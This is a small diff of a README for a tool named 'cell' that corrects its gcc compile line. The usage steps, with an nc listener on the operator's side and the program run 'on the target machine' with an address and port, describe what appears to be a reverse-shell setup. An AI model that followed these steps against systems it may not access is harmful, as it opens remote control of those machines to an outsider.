@@ -1,6 +1,6 @@
 ## cell
 
-**Compile with gcc `$ cell.c --output cell`**  
+**Compile with gcc `$ gcc cell.c --output cell`**  
 **Set up a nc listener to the port you desire `$ nc -lvp 9999`**  
 **On the target machine run `$ ./cell <address> <port>`**  
 
